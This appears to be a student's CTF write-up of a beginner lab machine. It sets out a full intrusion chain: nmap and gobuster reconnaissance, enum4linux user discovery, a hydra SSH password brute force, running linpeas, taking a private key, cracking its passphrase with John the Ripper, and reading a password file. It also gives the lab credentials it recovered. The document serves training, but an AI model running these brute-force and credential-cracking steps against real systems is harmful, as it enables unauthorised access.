# Day 14 — Final CTF & Self-Assessment (ctf_final.md)

**Overview**  
This file documents an end-to-end beginner-friendly CTF pentest practice done against a TryHackMe-style machine at IP `10.10.100.180`. It records the commands used, short explanations, outputs to look for, and the logical thought process from deployment to final credential discovery. Use this as a template for your final report and self-assessment.

---

## Deployment & Initial Notes
- Deployed the target VM with IP: `10.10.100.180` and confirmed connectivity by downloading the VM config into a directory on the attacker VM and opening it (the VM reported "we are connected").
- Basic network check: `(ping -c 4 10.10.100.180)`
  - *Explanation:* This verifies ICMP reachability and basic network connectivity to the target host.

---

## 1) SCANNING
### Goal
Discover open ports and services to choose an attack path.

### Commands & Actions
- Create a folder for nmap outputs:
  ```bash
  mkdir -p nmap
  ```
- Run an initial nmap scan with default scripts, version detection, and save the output:
  ```bash
  nmap -sC -sV -oN nmap/initial 10.10.100.180
  ```
  - *What this does:* `-sC` runs common NSE scripts, `-sV` attempts to detect service versions, `-oN` writes output to a human-readable file.
  - *Possible findings:* open ports (SSH 22, HTTP 80, SMB 139/445), service banners (e.g., `Apache/2.4.18 (Ubuntu)`), possible OS hints, and HTTP titles/pages.

**Observed (from the exercise):** Open ports: `22`, `80`, `139`, `445`. We chose to focus on HTTP first because web content often yields easy reconnaissance leads.

---

## 2) HTTP INVESTIGATION
### Goal
Inspect the web server for useful content or hidden directories.

### Commands & Actions
- Open `http://10.10.100.180` in a browser. The page displays "undergoing maintenance".
- View page source in the browser and find an HTML comment:
  ```html
  <!-- check our dev note section if you need to know what to work on -->
  ```
- Navigate to `/dev/` to follow the hint:
  - Open `http://10.10.100.180/dev/` in the browser and observe the server footer/banner: `Apache/2.4.18 (Ubuntu)`

*Conclusion:* The dev note hinted at hidden content; next step is directory brute forcing to discover web directories.

---

## 3) BRUTE FORCE (Web directories)
### Goal
Use a directory enumeration tool (gobuster) to find hidden paths under the web root.

### About gobuster (brief)
Gobuster is a fast directory and file brute-forcing tool that uses a wordlist to try likely paths on a web server. It helps quickly discover hidden directories and files.

### Command used
```bash
gobuster -w /opt/Dirbuster-0.12/directory-list-2.3-medium.txt -u http://10.10.100.180/
```
- *Explanation:* `-w` specifies the wordlist to use; `-u` sets the target URL to scan. Gobuster will request many candidate paths and report which return useful HTTP responses.

**Observed result:** Gobuster found `/development`.

- Open `http://10.10.100.180/development/` in the browser and find two text files: `dev.txt` and `j.txt` (with size and last modified metadata).

---

## 4) ENUMERATION (SMB / user discovery)
### Goal
Enumerate SMB and general host info to find usernames for brute force attempts.

### Command used
```bash
/opt/enum4linux/enum4linux.pl -a 10.10.100.180 | tee enum4linux.log
```
- *Explanation:* This runs `enum4linux` in aggressive mode (`-a`) against the target to enumerate SMB shares, users, groups, and other useful info, while `tee` saves the output to `enum4linux.log` for later review.

**Observed output (example):** The log showed user enumeration using SID resolution and revealed Unix users `kay` and `jan`. These usernames become candidate accounts for SSH brute forcing or other authentication attempts.

---

## 5) BRUTEFORCE (SSH passwords)
### Goal
Use a password guessing tool (hydra) to find valid SSH passwords for discovered users.

### Command used
```bash
hydra -l jan -P /opt/rockyou.txt ssh://10.10.100.180
```
- *Explanation:* `hydra` will attempt to SSH login as user `jan` using passwords from the specified `rockyou.txt` wordlist. This is an online brute-force attempt and should only be performed in authorized lab environments.

**Observed result:** Hydra discovered the password for `jan` as `Armando` (case-sensitive).

- Connect via SSH with the discovered credentials:
  ```bash
  ssh jan@10.10.100.180
  # when prompted, enter: Armando
  ```
- After login, run:
  ```bash
  ls -la
  ```
  to inspect files and permissions in the current directory. Note the visible directories (such as `/home/kay`) but limited privileges as `jan` (no sudo).

---

## 6) PRIVILEGE ESCALATION WITH LINPEAS
### Goal
Locate potential privilege escalation artifacts and credentials on the host.

### Steps & Commands
- From the attacker VM, copy `linpeas.sh` to the target's writable temporary directory (`/dev/shm`) using `scp`:
  ```bash
  scp /opt/linPEAS/linpeas.sh jan@10.10.100.180:/dev/shm
  # enter password: Armando
  ```
  - *Explanation:* `scp` securely copies the local `linpeas.sh` script to the target. `/dev/shm` is a common writable and volatile directory for temporary uploads.

- On the SSH session as `jan`:
  ```bash
  cd /dev/shm
  ls -la
  chmod +x linpeas.sh
  ./linpeas.sh | tee linlog.txt
  ```
  - *Explanation:* Make the script executable and run it; `tee` saves the output to `linlog.txt` for later review.

**Observed result from linpeas output:** In the SSH/SSL section, linpeas reported a private SSH key found at `/home/kay/.ssh/id_rsa` (permission/configuration indicated the file is present and readable to the jan user). This is a common privesc vector — exposed private keys can allow lateral or privilege escalation if the key is valid.

---

## 7) USING THE DISCOVERED SSH KEY (initial attempt)
### Goal
Try to use the discovered key to access `kay`'s account.

### Steps
- From the attacker VM, create a local file to store the key content (copy-paste the key from the linpeas output). For example, save it as `kay_id_rsa` and set strict permissions:
  ```bash
  nano kay_id_rsa     # paste the key content, save and exit
  chmod 600 kay_id_rsa
  ```
- Attempt SSH using the private key:
  ```bash
  ssh -i kay_id_rsa kay@10.10.100.180
  ```
- *Observed outcome:* The key is password-protected (encrypted) — SSH prompts for the key passphrase (so the private key alone was not sufficient).

---

## 8) CRACKING THE KEY PASSPHRASE WITH JOHN THE RIPPER
### Goal
Extract the passphrase protecting the private key using `ssh2john` and `john` with a wordlist (lab-only and authorized practice).

### Commands & Explanations
- Convert the OpenSSH key to a John-compatible hash format:
  ```bash
  /opt/JohnTheRipper/run/ssh2john.py kay_id_rsa > forjohn.txt
  ```
  - *What `ssh2john.py` does (brief):* It converts an encrypted SSH private key into a hash format that `john` can attempt to crack. This allows `john` to brute-force or wordlist-guess the passphrase protecting the key.

- Run `john` against the generated hash using `rockyou.txt`:
  ```bash
  /opt/JohnTheRipper/run/john forjohn.txt --wordlist=/opt/rockyou.txt
  ```
  - *What this `john` command does:* `john` reads the hash in `forjohn.txt` and tries passphrases from the given wordlist (`rockyou.txt`) to decrypt the key. It reports successful cracks when it finds the correct passphrase.

**Observed result:** `john` cracked the key passphrase as `beeswax` for user `kay`'s private key.

---

## 9) ACCESS AS KAY & FINAL PASSWORD DISCOVERY
### Steps
- SSH into the target using the decrypted private key (or key + passphrase):
  ```bash
  ssh -i kay_id_rsa kay@10.10.100.180
  # when asked for passphrase, enter: beeswax
  ```
- After logging in as `kay`, inspect the home directory and discovered file `pass.bak`:
  ```bash
  ls -la
  cat pass.bak
  ```
- The `pass.bak` file contains a password (in the exercise this revealed the final credential to progress or escalate further). This completes the CTF’s intended beginner flow: initial scan → web enumeration → SMB/user discovery → SSH brute force → linpeas discovery → private key extraction & cracking → final user access and secret disclosure.

---

## 10) Self‑Assessment & Lessons Learned (brief)
- **Skills practiced:** Nmap scanning, web enumeration (gobuster), SMB enumeration (enum4linux), password-guessing (hydra), file discovery and privilege escalation (linpeas), key extraction & cracking (ssh2john + john).  
- **Good practices reinforced:** Keep detailed logs (`tee`), use readonly techniques for PoCs, document every step with timestamps and evidence, and always operate in authorized labs.  
- **Areas to improve:** Faster parsing of linpeas output, learning more robust wordlists and targeted cracking strategies, and reviewing SSH key formats and protections.

---

## Appendix — Useful commands (summary)
```bash
# Network check
ping -c 4 10.10.100.180

# Nmap scan
nmap -sC -sV -oN nmap/initial 10.10.100.180

# Gobuster directory scan
gobuster -w /opt/Dirbuster-0.12/directory-list-2.3-medium.txt -u http://10.10.100.180/

# Enum4linux aggressive enumeration
/opt/enum4linux/enum4linux.pl -a 10.10.100.180 | tee enum4linux.log

# Hydra SSH brute-force (example)
hydra -l jan -P /opt/rockyou.txt ssh://10.10.100.180

# Copying linpeas to target
scp /opt/linPEAS/linpeas.sh jan@10.10.100.180:/dev/shm

# Run linpeas and save output
./linpeas.sh | tee linlog.txt

# Convert SSH key for John the Ripper
/opt/JohnTheRipper/run/ssh2john.py kay_id_rsa > forjohn.txt

# Crack key with john using rockyou
/opt/JohnTheRipper/run/john forjohn.txt --wordlist=/opt/rockyou.txt
```
